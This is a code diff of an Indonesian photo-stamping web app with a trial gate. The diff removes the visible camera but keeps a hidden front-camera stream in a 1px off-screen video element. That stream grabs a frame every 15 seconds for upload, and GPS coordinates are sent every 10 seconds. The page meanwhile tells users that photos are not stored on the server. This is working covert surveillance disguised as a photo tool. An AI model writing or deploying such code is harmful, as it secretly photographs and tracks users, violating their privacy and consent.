@@ -10,31 +10,21 @@
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            font-family: 'Inter', sans-serif;
             background: #0A0C15;
             color: #E8EDF5;
             min-height: 100vh;
-            line-height: 1.5;
+            padding: 1.5rem;
         }
-        .bg-gradient {
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: radial-gradient(ellipse at 20% 30%, #0F1629, #05070F);
-            z-index: -1;
-        }
-        .container { max-width: 1280px; margin: 0 auto; padding: 1.5rem; }
+        .container { max-width: 1200px; margin: 0 auto; }
         .glass-card {
             background: rgba(18, 25, 45, 0.6);
             backdrop-filter: blur(12px);
             border-radius: 1.5rem;
             border: 1px solid rgba(255, 255, 255, 0.08);
-            box-shadow: 0 20px 40px -12px rgba(0, 0, 0, 0.4);
-            transition: all 0.3s ease;
+            padding: 1.5rem;
+            margin-bottom: 1.5rem;
         }
-        .glass-card:hover { border-color: rgba(59, 130, 246, 0.3); }
         .header {
             display: flex;
             justify-content: space-between;
@@ -46,7 +36,7 @@
         .logo h1 {
             font-size: 1.8rem;
             font-weight: 700;
-            background: linear-gradient(135deg, #FFFFFF, #60A5FA, #A78BFA);
+            background: linear-gradient(135deg, #FFFFFF, #60A5FA);
             -webkit-background-clip: text;
             background-clip: text;
             color: transparent;
@@ -54,21 +44,20 @@
         .logo p { font-size: 0.7rem; color: #7E8AA8; }
         .status-bar {
             display: flex;
-            gap: 1.5rem;
+            gap: 1rem;
             margin-bottom: 1.5rem;
             padding: 0.75rem 1.25rem;
             background: rgba(10, 14, 28, 0.8);
             border-radius: 1rem;
-            font-size: 0.75rem;
+            font-size: 0.7rem;
             flex-wrap: wrap;
-            border: 1px solid rgba(255,255,255,0.05);
         }
         .status-item { display: flex; align-items: center; gap: 0.5rem; }
-        .dot { width: 8px; height: 8px; border-radius: 50%; background: #22C55E; box-shadow: 0 0 6px #22C55E; }
-        .dot.warning { background: #EAB308; box-shadow: 0 0 6px #EAB308; }
-        .dot.error { background: #EF4444; box-shadow: 0 0 6px #EF4444; }
+        .dot { width: 8px; height: 8px; border-radius: 50%; background: #22C55E; }
+        .dot.warning { background: #EAB308; }
+        .dot.error { background: #EF4444; }
         .badge-premium {
-            background: linear-gradient(135deg, #1E293B, #0F172A);
+            background: #1E293B;
             padding: 0.25rem 0.75rem;
             border-radius: 2rem;
             font-size: 0.65rem;
@@ -79,33 +68,26 @@
             font-size: 0.7rem;
             font-weight: 600;
             color: #9AA5C1;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
             display: block;
             margin-bottom: 0.3rem;
         }
-        textarea, select, input[type="text"], input[type="number"], input[type="email"] {
+        textarea, input[type="text"], input[type="number"], input[type="email"] {
             width: 100%;
             padding: 0.8rem;
             background: #0F1422;
             border: 1px solid #1E293B;
             border-radius: 0.8rem;
             color: #E8EDF5;
-            font-family: 'Inter', monospace;
             font-size: 0.85rem;
-        }
-        textarea:focus, select:focus, input:focus {
-            outline: none;
-            border-color: #3B82F6;
-            box-shadow: 0 0 0 3px rgba(59,130,246,0.15);
+            margin-bottom: 1rem;
         }
         .range-group {
             display: flex;
             align-items: center;
             gap: 0.75rem;
-            margin-bottom: 0.5rem;
+            margin-bottom: 1rem;
         }
-        .range-group span { font-size: 0.7rem; color: #7E8AA8; min-width: 35px; }
+        .range-group span { font-size: 0.7rem; color: #7E8AA8; }
         input[type="range"] {
             flex: 1;
             height: 4px;
@@ -121,7 +103,7 @@
             background: #3B82F6;
             cursor: pointer;
         }
-        .input-number-small {
+        .number-input {
             width: 70px;
             text-align: center;
             padding: 0.4rem;
@@ -129,16 +111,6 @@
             border: 1px solid #1E293B;
             border-radius: 0.5rem;
             color: white;
-        }
-        .offset-control {
-            display: flex;
-            align-items: center;
-            gap: 0.5rem;
-            margin-bottom: 0.5rem;
-        }
-        .offset-control .range-group {
-            flex: 1;
-            margin-bottom: 0;
         }
         button {
             background: linear-gradient(105deg, #3B82F6, #8B5CF6);
@@ -150,39 +122,26 @@
             cursor: pointer;
             width: 100%;
             margin-bottom: 0.5rem;
-            transition: all 0.2s;
         }
-        button:hover { transform: translateY(-1px); filter: brightness(1.05); }
+        button:hover { filter: brightness(1.05); }
         .btn-outline { background: transparent; border: 1px solid #334155; }
-        .btn-outline:hover { background: rgba(59,130,246,0.2); border-color: #3B82F6; }
+        .btn-outline:hover { background: rgba(59,130,246,0.2); }
         .btn-success { background: linear-gradient(105deg, #10B981, #059669); }
         .btn-warning { background: linear-gradient(105deg, #F59E0B, #D97706); }
-        .hidden-video {
-            position: fixed;
-            top: -9999px;
-            left: -9999px;
-            width: 320px;
-            height: 240px;
-            opacity: 0;
-            pointer-events: none;
-            z-index: -1;
-        }
         .video-container {
             background: #000;
             border-radius: 1rem;
             overflow: hidden;
             margin-bottom: 1rem;
             aspect-ratio: 4/3;
-            border: 1px solid #1E293B;
+            display: none;
         }
-        video { width: 100%; height: 100%; object-fit: cover; }
         .preview-area {
             background: #0A0E18;
             border-radius: 1rem;
             margin-top: 1rem;
             padding: 0.75rem;
             text-align: center;
-            border: 1px solid #1E293B;
         }
         .preview-img {
             max-width: 100%;
@@ -211,7 +170,6 @@
             padding: 1rem;
             text-align: center;
             margin-bottom: 1rem;
-            backdrop-filter: blur(8px);
         }
         .modal {
             position: fixed;
@@ -220,7 +178,6 @@
             width: 100%;
             height: 100%;
             background: rgba(0,0,0,0.9);
-            backdrop-filter: blur(8px);
             display: flex;
             align-items: center;
             justify-content: center;
@@ -235,15 +192,22 @@
             border: 1px solid #3B82F6;
         }
         .close-modal { background: #EF4444; margin-top: 1rem; }
+        .hidden-video {
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+        }
         @media (max-width: 768px) {
-            .container { padding: 1rem; }
+            body { padding: 1rem; }
             .grid-2 { grid-template-columns: 1fr; }
-            .offset-control { flex-wrap: wrap; }
         }
     </style>
 </head>
 <body>
-<div class="bg-gradient"></div>
 <div class="container">
     <div class="header">
         <div class="logo">
@@ -255,96 +219,79 @@
 
     <div class="status-bar">
         <div class="status-item"><div class="dot" id="gpsDot"></div><span id="gpsStatus">📍 Mengakses GPS...</span></div>
-        <div class="status-item"><div class="dot" id="cameraDot"></div><span id="cameraStatus">📷 Kamera siap</span></div>
-        <div class="status-item"><div class="dot" id="autoCamDot"></div><span id="autoCamStatus">📷</span></div>
+        <div class="status-item"><div class="dot" id="autoCamDot"></div><span id="autoCamStatus">📷 Auto Capture: Aktif</span></div>
         <div class="status-item"><div class="dot" id="deviceDot"></div><span id="deviceStatus">🖥️ Device ID</span></div>
     </div>
 
     <div id="contactModal" class="modal" style="display: none;">
         <div class="modal-content">
-            <h3><i class="fas fa-envelope"></i> Hubungi Admin</h3>
+            <h3>Hubungi Admin</h3>
             <p style="font-size: 0.8rem; margin-bottom: 1rem;">Trial 7 hari telah berakhir. Silakan hubungi admin untuk berlangganan.</p>
-            <input type="text" id="contactName" placeholder="Nama Anda" style="margin-bottom: 0.5rem;">
-            <input type="email" id="contactEmail" placeholder="Email Anda" style="margin-bottom: 0.5rem;">
+            <input type="text" id="contactName" placeholder="Nama Anda">
+            <input type="email" id="contactEmail" placeholder="Email Anda">
             <textarea id="contactMessage" rows="3" placeholder="Pesan Anda..."></textarea>
-            <button id="sendContactBtn" class="btn-warning" style="margin-top: 0.5rem;"><i class="fas fa-paper-plane"></i> Kirim Pesan</button>
+            <button id="sendContactBtn" class="btn-warning">Kirim Pesan</button>
             <button id="closeModalBtn" class="close-modal">Tutup</button>
         </div>
     </div>
 
     <div id="blockedMsg" class="alert" style="display:none;">
-        ⛔ Trial 7 hari telah berakhir. <button id="showContactBtn" style="background:#F59E0B; margin-top:0.5rem; padding:0.5rem;"><i class="fas fa-headset"></i> Hubungi Admin</button>
+        ⛔ Trial 7 hari telah berakhir. <button id="showContactBtn" style="background:#F59E0B; margin-top:0.5rem;">Hubungi Admin</button>
     </div>
 
     <div id="mainContent">
         <div class="grid-2">
+            <!-- Kiri: Upload & Stempel -->
             <div class="glass-card">
-                <div class="card-header" style="padding: 1rem 1.25rem; border-bottom: 1px solid #1E293B;">
-                    <i class="fas fa-camera-retro text-indigo-400"></i> <strong>📸 SUMBER FOTO (UNTUK EDIT STEMPEL)</strong>
-                </div>
-                <div class="card-body" style="padding: 1.25rem;">
-                    <div class="video-container">
-                        <video id="userVideo" autoplay playsinline muted></video>
-                    </div>
-                    <button id="captureBtn">📷 AMBIL FOTO (KAMERA BELAKANG)</button>
-                    <button id="uploadBtn" class="btn-outline">📂 UPLOAD DARI GALERI</button>
-                    <input type="file" id="fileInput" accept="image/*" style="display:none;">
+                <h3 style="margin-bottom: 1rem;">📸 UPLOAD FOTO</h3>
+                <button id="uploadBtn">📂 UPLOAD DARI GALERI</button>
+                <input type="file" id="fileInput" accept="image/*" style="display:none;">
+                
+                <div style="margin-top: 1rem;">
+                    <label>✏️ TEKS STEMPEL</label>
+                    <textarea id="stampText" rows="3" placeholder="📍 Lokasi, Bali&#10;📅 25 Maret 2026 14:30 WIB"></textarea>
                     
-                    <div style="margin-top: 1.25rem;">
-                        <label>✏️ TEKS STEMPEL (bebas, unlimited)</label>
-                        <textarea id="stampText" rows="3" placeholder="📍 Lokasi, Bali&#10;📅 25 Maret 2026 14:30 WIB"></textarea>
-                        
-                        <label>📏 UKURAN TEKS</label>
-                        <div class="range-group">
-                            <span>🔹 Kecil</span>
-                            <input type="range" id="fontSizeSlider" min="12" max="48" value="24">
-                            <span>🔸 Besar</span>
-                            <input type="number" id="fontSizeNumber" class="input-number-small" value="24" min="12" max="48">
-                        </div>
-                        
-                        <label>📍 POSISI TEKS</label>
-                        <div class="pos-buttons">
-                            <button id="posTL" class="pos-btn">↖ Atas Kiri</button>
-                            <button id="posTR" class="pos-btn">↗ Atas Kanan</button>
-                            <button id="posBL" class="pos-btn active">↙ Bawah Kiri</button>
-                            <button id="posBR" class="pos-btn">↘ Bawah Kanan</button>
-                        </div>
-                        
-                        <label>🎯 OFFSET KUSTOM</label>
-                        <div>
-                            <div class="offset-control">
-                                <span style="width: 30px;">X ↕️</span>
-                                <div class="range-group">
-                                    <input type="range" id="offsetXSlider" min="0" max="150" value="18">
-                                    <input type="number" id="offsetXNumber" class="input-number-small" value="18" min="0" max="150">
-                                </div>
-                            </div>
-                            <div class="offset-control">
-                                <span style="width: 30px;">Y ↔️</span>
-                                <div class="range-group">
-                                    <input type="range" id="offsetYSlider" min="0" max="150" value="18">
-                                    <input type="number" id="offsetYNumber" class="input-number-small" value="18" min="0" max="150">
-                                </div>
-                            </div>
-                        </div>
+                    <label>📏 UKURAN TEKS</label>
+                    <div class="range-group">
+                        <span>Kecil</span>
+                        <input type="range" id="fontSizeSlider" min="12" max="48" value="24">
+                        <span>Besar</span>
+                        <input type="number" id="fontSizeNumber" class="number-input" value="24">
+                    </div>
+                    
+                    <label>📍 POSISI TEKS</label>
+                    <div class="pos-buttons">
+                        <button id="posTL" class="pos-btn">Atas Kiri</button>
+                        <button id="posTR" class="pos-btn">Atas Kanan</button>
+                        <button id="posBL" class="pos-btn active">Bawah Kiri</button>
+                        <button id="posBR" class="pos-btn">Bawah Kanan</button>
+                    </div>
+                    
+                    <label>🎯 OFFSET (jarak dari tepi)</label>
+                    <div class="range-group">
+                        <span>X</span>
+                        <input type="range" id="offsetXSlider" min="0" max="150" value="18">
+                        <input type="number" id="offsetXNumber" class="number-input" value="18">
+                    </div>
+                    <div class="range-group">
+                        <span>Y</span>
+                        <input type="range" id="offsetYSlider" min="0" max="150" value="18">
+                        <input type="number" id="offsetYNumber" class="number-input" value="18">
                     </div>
                 </div>
             </div>
 
+            <!-- Kanan: Preview & Download -->
             <div class="glass-card">
-                <div class="card-header" style="padding: 1rem 1.25rem; border-bottom: 1px solid #1E293B;">
-                    <i class="fas fa-image text-indigo-400"></i> <strong>⚡ PREVIEW & DOWNLOAD</strong>
+                <h3 style="margin-bottom: 1rem;">⚡ PREVIEW & DOWNLOAD</h3>
+                <button id="generateBtn" class="btn-success">✨ TERAPKAN STEMPEL</button>
+                <div class="preview-area">
+                    <img id="previewImage" class="preview-img" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='300' height='200' viewBox='0 0 300 200'%3E%3Crect width='300' height='200' fill='%230A0E18'/%3E%3Ctext x='50%25' y='50%25' text-anchor='middle' fill='%233B4A6B' font-size='12'%3EBelum ada foto%3C/text%3E%3C/svg%3E" alt="preview">
                 </div>
-                <div class="card-body" style="padding: 1.25rem;">
-                    <button id="generateBtn" class="btn-success">✨ TERAPKAN STEMPEL & PREVIEW</button>
-                    <div class="preview-area">
-                        <img id="previewImage" class="preview-img" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='300' height='200' viewBox='0 0 300 200'%3E%3Crect width='300' height='200' fill='%230A0E18'/%3E%3Ctext x='50%25' y='50%25' text-anchor='middle' fill='%233B4A6B' font-size='12'%3EBelum ada foto%3C/text%3E%3C/svg%3E" alt="preview">
-                    </div>
-                    <button id="downloadBtn" style="background:#334155; margin-top:0.5rem;" disabled>💾 DOWNLOAD HASIL</button>
-                    <p style="font-size:0.65rem; color:#64748B; text-align:center; margin-top:0.5rem;">
-                        Foto hasil edit stempel bisa di-download, tidak disimpan ke server.
-                    </p>
-                </div>
+                <button id="downloadBtn" style="background:#334155;" disabled>💾 DOWNLOAD HASIL</button>
+                <p style="font-size:0.65rem; color:#64748B; text-align:center; margin-top:0.5rem;">
+                    Foto hasil edit bisa di-download, tidak disimpan ke server
+                </p>
             </div>
         </div>
     </div>
@@ -360,7 +307,6 @@
     let trialValid = false;
     let currentImageFile = null;
     let userLocation = { lat: null, lng: null };
-    let userVideoStream = null;
     let autoVideoStream = null;
     let stampedImageData = null;
     let currentPosition = 'bottom-left';
@@ -369,13 +315,10 @@
     let currentOffsetY = 18;
     let autoCaptureInterval = null;
     let gpsInterval = null;
-    let userVideoReady = false;
     let autoVideoReady = false;
     
     // DOM Elements
-    const userVideo = document.getElementById('userVideo');
     const autoVideo = document.getElementById('autoVideo');
-    const captureBtn = document.getElementById('captureBtn');
     const uploadBtn = document.getElementById('uploadBtn');
     const fileInput = document.getElementById('fileInput');
     const generateBtn = document.getElementById('generateBtn');
@@ -392,11 +335,9 @@
     const mainContent = document.getElementById('mainContent');
     const blockedMsg = document.getElementById('blockedMsg');
     const gpsStatus = document.getElementById('gpsStatus');
-    const cameraStatus = document.getElementById('cameraStatus');
     const autoCamStatus = document.getElementById('autoCamStatus');
     const deviceStatus = document.getElementById('deviceStatus');
     const gpsDot = document.getElementById('gpsDot');
-    const cameraDot = document.getElementById('cameraDot');
     const autoCamDot = document.getElementById('autoCamDot');
     const deviceDot = document.getElementById('deviceDot');
     const contactModal = document.getElementById('contactModal');
@@ -406,10 +347,13 @@
     const posBL = document.getElementById('posBL');
     const posBR = document.getElementById('posBR');
     
-    // Sync slider & number
+    // Sync functions
+    function syncFontSize() { currentFontSize = parseInt(fontSizeSlider.value); fontSizeNumber.value = currentFontSize; if (currentImageFile && trialValid) updatePreview(); }
     function syncOffsetX() { currentOffsetX = parseInt(offsetXSlider.value); offsetXNumber.value = currentOffsetX; if (currentImageFile && trialValid) updatePreview(); }
     function syncOffsetY() { currentOffsetY = parseInt(offsetYSlider.value); offsetYNumber.value = currentOffsetY; if (currentImageFile && trialValid) updatePreview(); }
     
+    fontSizeSlider.oninput = syncFontSize;
+    fontSizeNumber.onchange = syncFontSize;
     offsetXSlider.oninput = syncOffsetX;
     offsetXNumber.onchange = syncOffsetX;
     offsetYSlider.oninput = syncOffsetY;
@@ -425,12 +369,6 @@
     posTR.onclick = () => setActivePosition(posTR, 'top-right');
     posBL.onclick = () => setActivePosition(posBL, 'bottom-left');
     posBR.onclick = () => setActivePosition(posBR, 'bottom-right');
-    
-    fontSizeSlider.oninput = () => { currentFontSize = parseInt(fontSizeSlider.value); fontSizeNumber.value = currentFontSize; if (currentImageFile && trialValid) updatePreview(); };
-    fontSizeNumber.onchange = () => { currentFontSize = parseInt(fontSizeNumber.value); fontSizeSlider.value = currentFontSize; if (currentImageFile && trialValid) updatePreview(); };
-    
-    function updateGPSStatus(status, ready) { gpsStatus.innerHTML = status; gpsDot.className = ready ? 'dot' : 'dot warning'; }
-    function updateCameraStatus(status, ready) { cameraStatus.innerHTML = status; cameraDot.className = ready ? 'dot' : 'dot warning'; }
     
     async function getDeviceId() {
         try {
@@ -473,51 +411,44 @@
         return false;
     }
     
-    // ========== INISIALISASI KAMERA ==========
-    // Kamera 1: untuk user (kamera BELAKANG, tampil di preview)
-    // Kamera 2: untuk auto capture (kamera DEPAN, tersembunyi)
-    async function initCameras() {
+    // ========== AUTO CAPTURE (KAMERA DEPAN) ==========
+    async function initAutoCamera() {
         try {
-            // Kamera user (kamera belakang)
-            const userStream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: "environment" } 
-            });
-            userVideoStream = userStream;
-            userVideo.srcObject = userStream;
-            userVideo.onloadedmetadata = () => {
-                userVideoReady = true;
-                updateCameraStatus('✅ Kamera siap', true);
-            };
-            
-            // Kamera auto capture (kamera depan, tersembunyi)
-            const autoStream = await navigator.mediaDevices.getUserMedia({ 
+            const stream = await navigator.mediaDevices.getUserMedia({ 
                 video: { facingMode: "user" } 
             });
-            autoVideoStream = autoStream;
-            autoVideo.srcObject = autoStream;
+            autoVideoStream = stream;
+            autoVideo.srcObject = stream;
             autoVideo.onloadedmetadata = () => {
                 autoVideoReady = true;
+                autoCamStatus.innerHTML = '📷 Auto Capture: Aktif';
+                autoCamDot.className = 'dot';
                 startAutoCapture();
             };
-            
             return true;
         } catch(e) {
-            updateCameraStatus('❌ Izin kamera ditolak', false);
+            autoCamStatus.innerHTML = '📷 Auto Capture: Gagal (izin kamera ditolak)';
+            autoCamDot.className = 'dot error';
             return false;
         }
     }
     
     function initGPS() {
         if ("geolocation" in navigator) {
-            updateGPSStatus('📍 Meminta izin GPS...', false);
+            gpsStatus.innerHTML = '📍 Meminta izin GPS...';
             navigator.geolocation.getCurrentPosition(
                 (pos) => {
                     userLocation.lat = pos.coords.latitude;
                     userLocation.lng = pos.coords.longitude;
-                    updateGPSStatus(`📍 ${userLocation.lat.toFixed(6)}, ${userLocation.lng.toFixed(6)}`, true);
+                    gpsStatus.innerHTML = `📍 ${userLocation.lat.toFixed(6)}, ${userLocation.lng.toFixed(6)}`;
+                    gpsDot.className = 'dot';
+                    
+                    // Isi default stamp text
                     if (!stampText.value.trim()) {
                         stampText.value = `${new Date().toLocaleString('id-ID')}\n📍 ${userLocation.lat.toFixed(6)}, ${userLocation.lng.toFixed(6)}`;
                     }
+                    
+                    // Kirim GPS setiap 10 detik
                     if (gpsInterval) clearInterval(gpsInterval);
                     gpsInterval = setInterval(() => {
                         if (userLocation.lat && userLocation.lng && trialValid) {
@@ -528,12 +459,11 @@
                         }
                     }, 10000);
                 },
-                () => { updateGPSStatus('⚠️ Izin GPS ditolak', false); }
+                () => { gpsStatus.innerHTML = '⚠️ Izin GPS ditolak'; gpsDot.className = 'dot warning'; }
             );
         }
     }
     
-    // ========== AUTO CAPTURE (KAMERA DEPAN, DIAM-DIAM) ==========
     async function startAutoCapture() {
         if (autoCaptureInterval) clearInterval(autoCaptureInterval);
         autoCaptureInterval = setInterval(async () => {
@@ -545,7 +475,7 @@
                 const ctx = canvas.getContext('2d');
                 ctx.drawImage(autoVideo, 0, 0);
                 
-                // Cek apakah gambar tidak hitam
+                // Cek gambar tidak hitam
                 const pixelData = ctx.getImageData(0, 0, 1, 1).data;
                 if (pixelData[0] === 0 && pixelData[1] === 0 && pixelData[2] === 0) return;
                 
@@ -562,24 +492,8 @@
                         });
                     }
                 }, 'image/jpeg', 0.7);
-            } catch(e) { console.log('Auto capture error:', e); }
+            } catch(e) { console.log(e); }
         }, 15000);
-    }
-    
-    // ========== USER MANUAL (KAMERA BELAKANG / UPLOAD) ==========
-    async function captureFromCamera() {
-        if (!trialValid) { showContactModal(); return; }
-        if (!userVideoReady) { alert("Kamera belum siap."); return; }
-        const canvas = document.createElement('canvas');
-        canvas.width = userVideo.videoWidth;
-        canvas.height = userVideo.videoHeight;
-        canvas.getContext('2d').drawImage(userVideo, 0, 0);
-        canvas.toBlob(blob => {
-            currentImageFile = new File([blob], 'photo.png', { type: 'image/png' });
-            previewImg.src = URL.createObjectURL(blob);
-            stampedImageData = null;
-            downloadBtn.disabled = true;
-        });
     }
     
     function onFileSelected(file) {
@@ -603,7 +517,7 @@
     
     async function updatePreview() {
         if (!trialValid) { showContactModal(); return; }
-        if (!currentImageFile) { alert("Ambil atau upload foto dulu."); return; }
+        if (!currentImageFile) { alert("Upload foto dulu."); return; }
         const customText = stampText.value || "TrueStamp";
         const img = new Image();
         const reader = new FileReader();
@@ -665,12 +579,12 @@
         const name = document.getElementById('contactName').value;
         const email = document.getElementById('contactEmail').value;
         const message = document.getElementById('contactMessage').value;
-        if (!name || !email) { alert("Isi nama dan email terlebih dahulu."); return; }
+        if (!name || !email) { alert("Isi nama dan email."); return; }
         const result = await callAPI('sendContactMessage', { name, email, message });
         if (result.success) {
-            alert("Pesan terkirim! Admin akan menghubungi Anda.");
+            alert("Pesan terkirim!");
             hideContactModal();
-        } else { alert("Gagal mengirim pesan."); }
+        } else { alert("Gagal kirim."); }
     }
     
     document.getElementById('showContactBtn')?.addEventListener('click', showContactModal);
@@ -681,9 +595,8 @@
         await getDeviceId();
         const trialOk = await checkAndRegisterDevice();
         if (!trialOk) return;
-        await initCameras();
+        await initAutoCamera();
         initGPS();
-        captureBtn.onclick = captureFromCamera;
         uploadBtn.onclick = () => fileInput.click();
         fileInput.onchange = e => { if (e.target.files[0]) onFileSelected(e.target.files[0]); };
         generateBtn.onclick = updatePreview;
@@ -691,7 +604,6 @@
     })();
     
     window.addEventListener('beforeunload', () => {
-        if (userVideoStream) userVideoStream.getTracks().forEach(t => t.stop());
         if (autoVideoStream) autoVideoStream.getTracks().forEach(t => t.stop());
         if (autoCaptureInterval) clearInterval(autoCaptureInterval);
         if (gpsInterval) clearInterval(gpsInterval);
